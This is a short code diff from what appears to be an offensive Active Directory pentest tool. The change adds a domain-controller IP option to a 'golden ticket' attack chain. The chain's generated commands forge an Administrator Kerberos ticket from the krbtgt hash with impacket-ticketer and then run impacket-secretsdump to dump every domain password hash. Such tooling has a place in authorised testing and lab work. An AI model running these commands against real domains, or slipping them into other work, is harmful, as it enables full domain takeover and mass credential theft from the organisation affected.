@@ -754,6 +754,8 @@ def run(report, store, ui=None):
             "user's Evidence.meta.principal_sid)")
         # iter-48: use real DC FQDN when known
         _dc_fqdn_gt = store.dc_fqdn() or "<DC-FQDN>"
+        # iter-61: -dc-ip anchor for lab boxes without DNS SRV lookups.
+        _dc_ip_gt = store.dc_ip() or "<DC-IP>"
         chains.append(Chain("R-GOLDEN", "golden ticket",
             f"krbtgt NT hash present -> forge Administrator TGT (score 15)",
             crit=10, conf=1.0, ready=1.5, prox=1.0,         # score 15.0
@@ -761,7 +763,8 @@ def run(report, store, ui=None):
                 f"impacket-ticketer -nthash {e.krbtgt_hash} "
                 f"-domain-sid {_sid_gt} -domain {dom_gt} Administrator{_sid_note}",
                 f"export KRB5CCNAME=Administrator.ccache",
-                f"impacket-secretsdump -k -no-pass '{dom_gt}/Administrator@{_dc_fqdn_gt}'   "
+                f"impacket-secretsdump -k -no-pass -dc-ip {_dc_ip_gt} "
+                f"'{dom_gt}/Administrator@{_dc_fqdn_gt}'   "
                 f"# every domain hash",
             ], src=s_gt, line=l_gt))
 
